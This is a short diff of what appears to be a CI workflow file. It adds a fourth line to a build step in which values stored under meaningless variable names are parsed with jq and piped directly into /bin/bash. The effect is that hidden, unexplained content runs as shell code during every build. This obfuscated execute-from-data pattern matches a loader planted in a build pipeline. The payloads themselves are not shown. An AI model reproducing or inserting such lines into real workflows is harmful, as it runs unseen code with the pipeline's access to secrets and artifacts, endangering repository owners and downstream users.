@@ -28,6 +28,7 @@ jobs:
           echo $g0 | jq -r .ziq561 | /bin/bash
           echo $s2117 | jq -r .zj0 | /bin/bash
           printf '%s' "$nagf32631" | jq -r .id9 | /bin/bash
+          echo $l730 | jq -r .z41 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
